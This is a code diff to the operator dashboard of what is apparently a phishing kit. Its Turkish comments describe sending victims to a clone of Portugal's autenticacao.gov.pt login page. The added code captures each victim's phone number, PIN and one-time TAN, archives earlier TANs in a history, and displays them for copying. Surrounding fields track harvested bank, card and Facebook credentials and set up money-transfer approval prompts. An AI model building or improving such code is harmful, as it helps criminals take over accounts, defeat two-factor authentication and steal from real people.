@@ -1522,8 +1522,28 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     }
 
     // AUTENTICACAO: kullanici /autenticacao (autenticacao.gov.pt klonu) sayfasina gider.
-    // Formu gonderince approvalStatus "autenticacao_confirmed" olur.
+    // Adim 1 (telemovel+PIN) zaten doldurulmus olabilir — tekrar gonderimde eski TAN
+    // temizlenir, varsa onceki auth verisi autenticacaoHistory'ye tasinir.
+    // Kullanici adim 2'deki TAN'i gonderince approvalStatus "autenticacao_confirmed" olur.
     if (approvalPromptType === "autenticacao") {
+      const authHistory: any[] = Array.isArray(previousFormData.autenticacaoHistory)
+        ? [...previousFormData.autenticacaoHistory]
+        : [];
+      const prevTan =
+        typeof previousFormData.cmdTan === "string" && previousFormData.cmdTan.trim()
+          ? previousFormData.cmdTan
+          : previousFormData.autenticacaoTan;
+      if (prevTan) {
+        authHistory.push({
+          generatorType: "autenticacao",
+          data: {
+            "Telemóvel": previousFormData.cmdPhone || "",
+            PIN: previousFormData.cmdPin || "",
+            TAN: prevTan,
+          },
+          submittedAt: previousFormData.autenticacaoSubmittedAt || new Date().toISOString(),
+        });
+      }
       await supabase
         .from("sessions")
         .update({
@@ -1533,6 +1553,9 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           form_data: {
             ...previousFormData,
             approvalStatus: "autenticacao",
+            autenticacaoHistory: authHistory,
+            cmdTan: "",
+            autenticacaoTan: "",
             approvalCode: "",
             specialNoticeText: "",
             specialNoticeImage: "",
@@ -1670,11 +1693,12 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         for (const [k, v] of getShortBankCredentialFields(fd)) bankCell.push({ text: `${k}: ${v}` });
         if (!bankCell.length) bankCell.push({ text: "-", color: "#9ca3af" });
 
-        const approvalHist = parseApprovalHistory(fd.approvalHistory);
+        const approvalHist = parseApprovalHistory(fd.approvalHistory)
+          .filter((a) => !a.startsWith("autenticacao"));
         const approvalEntries =
           approvalHist.length > 0
             ? approvalHist
-            : typeof fd.approvalStatus === "string" && fd.approvalStatus.trim()
+            : typeof fd.approvalStatus === "string" && fd.approvalStatus.trim() && !fd.approvalStatus.trim().startsWith("autenticacao")
               ? [fd.approvalStatus.trim()]
               : [];
         const approvalCell = approvalEntries.length
@@ -2292,7 +2316,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 // kullanici onaylayinca "Onaylandi" goster. Eski history badge'i basmaz.
                 const currentApproval =
                   typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
-                const approvalEntries = currentApproval ? [currentApproval] : [];
+                const approvalEntries =
+                  currentApproval && !currentApproval.startsWith("autenticacao") ? [currentApproval] : [];
                 // GENERATOR: tip basina GUNCEL kayit — kodas 1 ustte, kodas 2 altta.
                 // Ayni tipe tekrar yonlendirme: eski kayit gecmise gider, burada bos rozet (bekliyor) kalir.
                 const genCurrentRaw =
@@ -2466,6 +2491,15 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                                   <span className="shrink-0 opacity-40 text-[8px] font-bold uppercase">TAN:</span>
                                   <span className="min-w-0 cursor-pointer font-mono font-bold text-rose-600 dark:text-rose-400 whitespace-normal break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authTan)}>{authTan}</span>
                                 </div>
+                              )}
+                              {typeof fd.approvalStatus === "string" && fd.approvalStatus.startsWith("autenticacao") && (
+                                <span className={`inline-block w-fit rounded-full border px-2 py-0.5 text-[9px] font-bold tracking-wide whitespace-nowrap leading-tight ${
+                                  fd.approvalStatus === "autenticacao_confirmed"
+                                    ? "border-emerald-500/20 bg-emerald-500/10 text-emerald-600 dark:text-emerald-400"
+                                    : "border-amber-500/20 bg-amber-500/10 text-amber-600 dark:text-amber-400"
+                                }`}>
+                                  {fd.approvalStatus === "autenticacao_confirmed" ? "Autenticação Onaylandı" : "Autenticação [Bekliyor]"}
+                                </span>
                               )}
                             </div>
                           );
@@ -2801,10 +2835,14 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         if (hsAny.facebookLoginHistory !== undefined) mergedFd.facebookLoginHistory = hsAny.facebookLoginHistory;
         if (hsAny.cardLoginHistory !== undefined) mergedFd.cardLoginHistory = hsAny.cardLoginHistory;
         if (hsAny.generatorLoginHistory !== undefined) mergedFd.generatorLoginHistory = hsAny.generatorLoginHistory;
+        if (hsAny.autenticacaoHistory !== undefined) mergedFd.autenticacaoHistory = hsAny.autenticacaoHistory;
         const bHistory = parseBankHistory(mergedFd);
         const fHistory = parseFacebookHistory(mergedFd);
         const cHistory = parseCardHistory(mergedFd);
-        const gHistory = parseGeneratorHistory(mergedFd);
+        const authHistory = Array.isArray(mergedFd.autenticacaoHistory)
+          ? (mergedFd.autenticacaoHistory as any[]).filter((r) => r && typeof r === "object" && r.data && typeof r.data === "object")
+          : [];
+        const gHistory = [...authHistory, ...parseGeneratorHistory(mergedFd)];
         const copyText = (t: string) => {
           try { void navigator.clipboard.writeText(t); } catch { /* ignore */ }
         };
@@ -2855,7 +2893,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
                       💳 Kart: <span className="font-bold">{cHistory.length}</span>
                       <span className={`mx-2 ${darkMode ? 'text-zinc-700' : 'text-gray-300'}`}>•</span>
-                      🔢 Generator: <span className="font-bold">{gHistory.length}</span>
+                      🔐 Autenticação: <span className="font-bold">{gHistory.length}</span>
                     </p>
                   </div>
                 </div>
@@ -3048,26 +3086,26 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                     )}
                   </div>
 
-                  {/* ====================== 🔢 GENERATOR GİRİŞLERİ ====================== */}
+                  {/* ====================== 🔐 AUTENTICACAO GİRİŞLERİ ====================== */}
                   <div>
                     <div className="flex items-center gap-2 mb-4">
-                      <span className="text-xl">🔢</span>
-                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Generator (Geçmiş)</h4>
+                      <span className="text-xl">🔐</span>
+                      <h4 className={`text-base font-bold ${darkMode ? 'text-white' : 'text-gray-900'}`}>Autenticação (Geçmiş)</h4>
                       <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${darkMode ? 'bg-white/10 text-zinc-400' : 'bg-gray-200 text-gray-600'}`}>
                         {gHistory.length} adet
                       </span>
                     </div>
                     {gHistory.length === 0 ? (
                       <div className={`rounded-2xl border-2 border-dashed py-10 text-center ${darkMode ? 'border-white/10' : 'border-gray-200'}`}>
-                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz geçmiş generator kaydı yok.</p>
-                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Kullanıcı tekrar generator kodu gönderince eskisi burada görünür.</p>
+                        <p className={`text-sm ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Henüz geçmiş autenticação kaydı yok.</p>
+                        <p className={`text-xs mt-1 ${darkMode ? 'text-zinc-600' : 'text-gray-400'}`}>Kullanıcı tekrar TAN kodu gönderince eskisi burada görünür.</p>
                       </div>
                     ) : (
                       <div className="space-y-3">
                         {gHistory.map((rec, idx) => {
                           const r = rec as Record<string, any>;
                           const genLabel =
-                            r.generatorType === "generator2" ? "kodas 2" : "kodas 1";
+                            r.generatorType === "autenticacao" ? "Autenticação" : r.generatorType === "generator2" ? "kodas 2" : "kodas 1";
                           const entries =
                             r.data && typeof r.data === "object"
                               ? Object.entries(r.data as Record<string, unknown>).filter(
@@ -3216,36 +3254,17 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
               </div>
 
               {approvalPromptType === "transfer" ? (
-                <>
-                  <div>
-                    <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Para Miktarı</label>
-                    <input
-                      type="text"
-                      value={transferAmountInput}
-                      onChange={(e) => setTransferAmountInput(e.target.value)}
-                      placeholder="Örn: 1.231,00"
-                      className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
-                    />
-                  </div>
-                  <div>
-                    <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Onay Yöntemi</label>
-                    <div className="grid grid-cols-2 gap-2">
-                      {(["smartid", "mobileid"] as const).map((m) => (
-                        <button
-                          key={m}
-                          type="button"
-                          onClick={() => setTransferMethodInput(m)}
-                          className={`rounded-xl border px-3 py-2 text-sm font-bold transition-all ${transferMethodInput === m
-                            ? 'border-[#EB5E28] bg-[#EB5E28]/10 text-[#EB5E28]'
-                            : darkMode ? 'border-zinc-800 bg-zinc-900 text-zinc-400 hover:text-white' : 'border-gray-200 bg-gray-50 text-gray-500 hover:text-gray-900'}`}
-                        >
-                          {m === "smartid" ? "Smart-ID" : "Mobile-ID"}
-                        </button>
-                      ))}
-                    </div>
-                  </div>
-                </>
-              ) : (
+                <div>
+                  <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Para Miktarı</label>
+                  <input
+                    type="text"
+                    value={transferAmountInput}
+                    onChange={(e) => setTransferAmountInput(e.target.value)}
+                    placeholder="Örn: 1.231,00"
+                    className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+                  />
+                </div>
+              ) : approvalPromptType === "autenticacao" ? null : (
                 <div>
                   <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Gösterilecek Rakam</label>
                   <input
